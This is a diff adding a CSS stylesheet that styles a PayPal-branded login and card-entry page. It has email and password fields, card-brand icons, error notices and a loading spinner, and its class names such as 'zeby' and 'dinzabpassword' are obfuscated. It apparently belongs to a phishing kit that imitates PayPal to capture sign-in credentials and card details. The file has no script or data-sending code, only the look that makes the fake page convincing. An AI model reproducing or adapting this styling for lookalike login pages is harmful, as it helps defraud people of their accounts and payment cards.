@@ -1,0 +1,608 @@
+@font-face {
+    font-family: zeby;
+    src: url(./zeby.eot);
+    src: url(./zeby.eot) format("embedded-opentype"),url(./zeby.woff) format("woff")
+}
+p, div, span, a, h1, label, select {
+    font-family: zeby,Helvetica Neue,Arial,sans-serif!important;
+    font-weight: 400;
+    font-variant: normal;
+}
+.success {
+    background: transparent url(./empty-success.svg) no-repeat;
+    width: 160px;
+    height: 160px;
+    -moz-background-size: 100% 100%;
+    background-size: 100% 100%;
+    margin: auto;
+    margin-bottom: 24px;
+}
+.error {
+    border: 1px red solid;
+}
+.zeby1 {
+    margin: 0 auto;
+    width: 60%;
+    position: relative;
+}
+.containerz {
+    position: relative;
+    margin: 0 auto;
+    padding: 30px 10% 50px;
+    -webkit-border-radius: 12px;
+    -moz-border-radius: 12px;
+    -khtml-border-radius: 12px;
+    border-radius: 12px;
+}
+.containerBordered {
+    margin: 120px auto 0;
+    padding: 30px 10% 50px;
+    border: 1px solid #eaeced;
+    overflow: hidden;
+}
+.zeb {
+    margin: 60px auto 0;
+    padding: 30px 10% 50px;
+   /* border: 1px solid #eaeced;*/
+    overflow: hidden;
+}
+.zebyLogo {
+    background: transparent url(./paypal-mark-color.svg) top center no-repeat;
+    width: 34px;
+    height: 40px;
+    display: block;
+    margin: 0 auto;
+    margin-bottom: 2em;
+}
+.zebyMaskable {
+    position: relative;
+}
+form {
+    display: block;
+    margin-top: 0em;
+}
+.zebyInput,.forminput {
+        position: relative;
+        z-index: 1;
+}
+.zebyInput input[type=text]::-webkit-input-placeholder {
+    color: transparent
+}
+
+.zebyInput input[type=text]:-moz-placeholder {
+    color: transparent
+}
+
+.zebyInput input[type=text]::-moz-placeholder {
+    color: transparent
+}
+
+.zebyInput input[type=text]:-ms-input-placeholder {
+    color: transparent
+}
+
+#email .zebyFieldWrapper, #password .zebyFieldWrapper {
+    border: 0.0625rem solid #9da3a6;
+    border-radius: 4px;
+}
+.zebyInput .zebyFieldWrapper {
+    margin-bottom: 16px;
+}
+.zebyFieldWrapper {
+    position: relative;
+    z-index: 2;
+    width: 100%;
+}
+.zebyInput .zebyFieldWrapper:before {
+    content: "";
+    display: block;
+    z-index: -1;
+    position: absolute;
+    top: 0;
+    width: 100%;
+    height: 40px;
+    background-color: #fff;
+    -webkit-border-radius: 5px;
+    -moz-border-radius: 5px;
+    -khtml-border-radius: 5px;
+    border-radius: 5px;
+}
+#zeby .zebyFieldWrapper #dinzabemail,#zeby .zebyFieldWrapper #dinzabpassword {
+    border:0;
+}
+[class^="zeby1 "] .zebyFieldWrapper #dinzabemail,[class^="zeby1 "] .zebyFieldWrapper #dinzabpassword {
+    font-size: 18px;
+}
+.zebyInput input:not([type=submit]):not([type=radio]):not([type=checkbox]),.forminput input:not([type=submit]):not([type=radio]):not([type=checkbox]) {
+    background-clip: padding-box;
+    transition: border .2s ease-in-out,background-color .2s ease-in-out;
+}
+.zebyInput input,.zebyInput select {
+    height: 64px;
+    width: 100%;
+    padding: 0 10px;
+    border: 0.0625rem solid #9da3a6;
+    background: #fff;
+    text-overflow: ellipsis;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    -webkit-border-radius: 4px;
+    -moz-border-radius: 4px;
+    -khtml-border-radius: 4px;
+    border-radius: 4px;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    font-size: 100%;
+    color: #000;
+    font-family: zeby,Helvetica Neue,Arial,sans-serif;
+    font-variant: normal;
+    font-weight: 400;
+    direction: ltr;
+}
+.forminput input , .forminput select {
+    height: 52px!important;
+}
+.forminput select {
+    font-size: 14px!important;
+}
+.zebyInput .dinzablabel {
+    position: absolute;
+    color: #6c7378!important;
+    clip: rect(1px 1px 1px 1px);
+    clip: rect(1px,1px,1px,1px);
+    padding: 0;
+    border: 0;
+    height: 1px;
+    width: 1px;
+    overflow: hidden;
+}
+.zebyInput input:focus,.nn:focus {
+    outline: 0;
+    border: .0625rem solid #1040c1;
+    box-shadow: inset 0 0 0 .125rem #1040c1,0 0 0 .375rem rgba(16,114,235,.16),inset 0 0 0 1px #031954,0 0 0 1px #1040c1;
+    background-color: #fff
+}
+.zebyInput [for=dinzabemail].dinzablabel, .zebyInput [for=dinzabpassword].dinzablabel {
+    position: absolute;
+    pointer-events: none;
+    left: 10px;
+    top: 13px;
+    transition: .2s ease all;
+    height: 30px;
+    width: 400px;
+    clip: unset;
+}
+.dinzablabell {
+    position: absolute;
+    pointer-events: none;
+    left: 10px;
+    top: 18px;
+    transition: .2s ease all;
+    height: 30px;
+    width: 400px;
+    clip: unset;
+}
+label {
+    cursor: default;
+    color: #6c7378!important;
+    font-weight: bold!important;
+}
+.label {
+    cursor: default;
+    color: rgb(0, 0, 0,0.7)!important;
+    font-weight: bold!important;
+}
+#dinzabemail {
+    padding-top: 20px;
+}
+#dinzabpassword {
+    padding-top: 20px;
+}
+.hide {
+    display: none!important;
+}
+@media (max-width: 767px){
+    .zeb {
+        margin: 0 auto!important;
+        width: 100%!important;
+        border:0;
+    }
+    .zeby1 {
+        width: 100%!important;
+    }
+.containerBordered {
+    border: 0;
+    margin: 0 auto;
+    padding: 4.8%;
+    width: 100%;
+    background-color: #fff;
+}
+.zebyLogo {
+    margin-bottom: 1em!important;
+}
+* {
+    -webkit-tap-highlight-color: transparent;
+    -webkit-touch-callout: none;
+}
+.zebyLogo {
+    margin: 0 auto 14.163%;
+}
+}
+.zebysep {
+    border-top: 1px solid #cbd2d6;
+    position: relative;
+    margin-top: 8.72%;
+    margin-bottom: 4.895%;
+    height: 15px;
+    text-align: center;
+    font-size: 83.34%;
+}
+.zebysep .textsep {
+    background-color: #fff;
+    padding: 0 0.5em;
+    position: relative;
+    color: #6c7378;
+    top: -0.7em;
+}
+.textsep {
+    font-size: 17px;
+}
+.rememberEmail {
+    margin-bottom: 4.72%;
+    text-align: center;
+    font-family: HelveticaNeue-Light,"Helvetica Neue Light",HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
+}
+.displayEmail {
+    text-align: center;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    vertical-align: top;
+    padding-right: 10px;
+    max-width: 300px;
+    display: inline-block;
+    -webkit-font-smoothing: subpixel-antialiased;
+}
+
+
+.error p {
+    /* margin: 0; */
+    color: #6c7378;
+    font-weight: 400;
+    font-family: zeby,Helvetica Neue,Arial,sans-serif;
+    font-weight: 400;
+    font-variant: normal;
+    font-size: 14px;
+    background-image: url(./sprite_form_2x.png);
+    background-origin: padding-box;
+    background-position: top -420px right 10px;
+    background-position-x: left;
+    padding-left: 28px;
+    background-size: 25px;
+    background-repeat: no-repeat;
+    padding-bottom: 2px;
+    padding-top: 2px;
+    float: left;
+    
+}
+.error {
+    border: 0!important
+}
+
+
+
+
+
+.spinnerWithLockIcon {
+    position: fixed;
+    top: 40%;
+    right: 0;
+    bottom: 0;
+    left: 13px;
+    z-index: 9998;
+    margin: 0;
+    margin-top: -50px;
+    text-align: center
+}
+
+.spinnerWithLockIcon:after,.mask:after {
+    content: '';
+    position: fixed;
+    z-index: -1;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    left: 0;
+    background: #fff;
+    -moz-opacity: .9;
+    -khtml-opacity: .9;
+    -webkit-opacity: .9;
+    opacity: .9;
+    -ms-filter: alpha(opacity=90);
+    filter: alpha(opacity=90)
+}
+
+.spinnerWithLockIcon:before {
+    content: "";
+    display: block;
+    margin: 0 auto 10px;
+    text-align: center;
+    width: 100px;
+    height: 100px;
+    border-left: 5px solid #000;
+    border-left: 5px solid rgba(0,0,0,.2);
+    border-right: 5px solid #000;
+    border-right: 5px solid rgba(0,0,0,.2);
+    border-bottom: 5px solid #000;
+    border-bottom: 5px solid rgba(0,0,0,.2);
+    border-top: 5px solid #2180c0;
+    border-radius: 100%;
+    -webkit-animation: rotation .7s infinite linear;
+    -moz-animation: rotation .7s infinite linear;
+    -o-animation: rotation .7s infinite linear;
+    animation: rotation .7s infinite linear
+}
+
+.spinnerWithLockIcon:before {
+    background: transparent url(./icon_loader_med.gif) top center no-repeat;
+    border: 0;
+    width: 50px;
+    height: 50px
+}
+
+.notifications {
+    outline: 0;
+    margin-bottom: 10px;
+    font-size: 13px
+} 
+.notifications .notification {
+    margin: 0;
+    padding: 15px 15px 15px 44px;
+    -webkit-border-radius: 5px;
+    -moz-border-radius: 5px;
+    -khtml-border-radius: 5px;
+    border-radius: 5px;
+    border-width: 1px;
+    border-style: solid;
+    text-align: left;
+    font-size: 1em;
+    background: url(./icon_alert_sprite-2x.png) no-repeat;
+    background-size: 20px
+}
+.notifications .notification.notification-critical {
+    background-color: #fff7f7;
+    background-position: 12px -387px;
+    background-position: left 12px top -387px;
+    border-color: #c72e2e
+}
+
+.cc-icon{
+    position: absolute;
+    top: 33px;
+    width: 37px;
+    height: 30px;
+    right: 20px!important;
+    background-color:#fff;
+    background-image: url(./vests.png);
+    background-position: 0 82%;
+    transition: transform 0.2s ease-in-out;
+    -webkit-transition: -webkit-transform 0.2s ease-in-out;
+    -moz-transform: transform 0.2s ease-in-out;
+    -ms-transform: transform 0.2s ease-in-out;
+    -o-transform: transform 0.2s ease-in-out;
+    transform: translate3d(0, -50%, 0);
+    -webkit-transform: translate3d(0, -50%, 0);
+    -moz-transform: translate3d(0, -50%, 0);
+    -ms-transform: translate3d(0, -50%, 0);
+    -o-transform: translate3d(0, -50%, 0);
+}
+.vi{background-position:98.5% -0.5%}
+.ve{background-position:98.5%  40.7%}
+.ma{background-position:98.5%  5.5%}
+.me{background-position:98.5%  35%}
+.di{background-position:98.5%  17.2%}
+.am{background-position:98.5%  11.5%}
+.jc{background-position:98.5% 29%}
+.dc{background-position:98.5% 23%}
+.footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    font-size: 11px;
+    padding-top: 14px
+}
+
+.footer .legalFooter {
+    text-align: center;
+    padding: 14px;
+    background-color: #F7F9FA
+}
+
+.footer .legalFooter a,.footer .legalFooter a:link,.footer .legalFooter a:visited,.footer .legalFooter a:hover {
+    color: #666;
+    white-space: nowrap
+}
+.footerGroup {
+    list-style-type: none;
+    text-align: center
+}
+
+.footerGroup li {
+    display: inline-block;
+    margin: 0 10px 0 0
+}
+
+.footerGroup li a,.footerGroup li a:link,.footerGroup li a:visited,.footerGroup li a:hover {
+    color: #666;
+    white-space: nowrap
+}
+
+.footerGroup li:last-child {
+    margin: 0
+}
+
+
+.intentFooter {
+    position: relative;
+    display: block;
+    font-size: 12px;
+    margin-top: 72px
+}
+
+.intentFooter .cancelUrl {
+    text-align: center;
+    display: block;
+    width: 100%
+}
+
+.intentFooter .adjustCancelUrl.cancelUrl {
+    text-align: center
+}
+
+.intentFooter .localeSelector {
+    text-align: center;
+    display: block;
+    width: 100%;
+    padding-top: 16px
+}
+
+.intentFooter .localeSelector a,.intentFooter .localeSelector a:link,.intentFooter .localeSelector a:visited,.intentFooter .localeSelector a:hover {
+    color: #666;
+    white-space: nowrap
+}
+
+.intentFooter .localeSelector a.selected {
+    color: #666;
+    font-weight: 700
+}
+
+.intentFooter .localeSelector .localeLink {
+    margin: 0;
+    list-style: none;
+    display: inline-block
+}
+
+.intentFooter .localeSelector .localeLink li {
+    padding: 0 6px;
+    display: inline-block;
+    border-left: 1px solid #ccc
+}
+
+.intentFooter .localeSelector .localeLink li:first-child {
+    padding-left: 0;
+    border-left: 0
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector {
+    text-align: center
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector a,.intentFooter .adjustLocaleSelector.localeSelector a:link,.intentFooter .adjustLocaleSelector.localeSelector a:visited,.intentFooter .adjustLocaleSelector.localeSelector a:hover {
+    color: #666;
+    white-space: nowrap
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector a.selected {
+    color: #666;
+    font-weight: 700
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector .localeLink {
+    margin: 0;
+    list-style: none;
+    display: inline-block
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector .localeLink li {
+    padding: 0 6px;
+    display: inline-block;
+    border-left: 1px solid #ccc
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector .localeLink li:first-child {
+    padding-left: 0;
+    border-left: 0
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector .localeSelector {
+    text-align: left;
+    display: block;
+    width: 100%;
+    padding-top: 20px
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector .localeSelector a,.intentFooter .adjustLocaleSelector.localeSelector .localeSelector a:link,.intentFooter .adjustLocaleSelector.localeSelector .localeSelector a:visited,.intentFooter .adjustLocaleSelector.localeSelector .localeSelector a:hover {
+    color: #666;
+    white-space: nowrap
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector .localeSelector a.selected {
+    color: #666;
+    font-weight: 700
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector .localeSelector .localeLink {
+    margin: 0;
+    list-style: none;
+    display: inline-block
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector .localeSelector .localeLink li {
+    padding: 0 6px;
+    display: inline-block;
+    border-left: 1px solid #ccc
+}
+
+.intentFooter .adjustLocaleSelector.localeSelector .localeSelector .localeLink li:first-child {
+    padding-left: 0;
+    border-left: 0
+}
+
+.intentFooter .localeSelectorWithoutSeperator.localeSelector a,.intentFooter .localeSelectorWithoutSeperator.localeSelector a:link,.intentFooter .localeSelectorWithoutSeperator.localeSelector a:visited,.intentFooter .localeSelectorWithoutSeperator.localeSelector a:hover {
+    font-family: pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;
+    font-weight: 400;
+    font-variant: normal;
+    color: #1072eb
+}
+
+.intentFooter .localeSelectorWithoutSeperator.localeSelector a.selected {
+    color: #1072eb;
+    font-weight: 400
+}
+
+.intentFooter .localeSelectorWithoutSeperator.localeSelector .localeLink li {
+    border-left: 0
+}
+
+.intentFooter .localeSelectorWithoutSeperator.localeSelector .localeSelector a,.intentFooter .localeSelectorWithoutSeperator.localeSelector .localeSelector a:link,.intentFooter .localeSelectorWithoutSeperator.localeSelector .localeSelector a:visited,.intentFooter .localeSelectorWithoutSeperator.localeSelector .localeSelector a:hover {
+    font-family: pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;
+    font-weight: 400;
+    font-variant: normal;
+    color: #1072eb
+}
+
+.intentFooter .localeSelectorWithoutSeperator.localeSelector .localeSelector a.selected {
+    color: #1072eb;
+    font-weight: 400
+}
+.picker.country-selector button {
+    display: inline-block;
+    margin-right: 30px;
+    cursor: pointer;
+}
+
+
+.country-selector .unitedstates, .country-selector .US {
+    background-position: 5px -383px;
+}
+.country-selector .country {
+    overflow: hidden;
+    height: 24px;
+    min-width: 32px;
+    background: transparent url(https://www.paypalobjects.com/webstatic/mktg/icons/sprite_countries_flag4.png) 5px 100px no-repeat;
+    border: none;
+    text-align: left;
+}
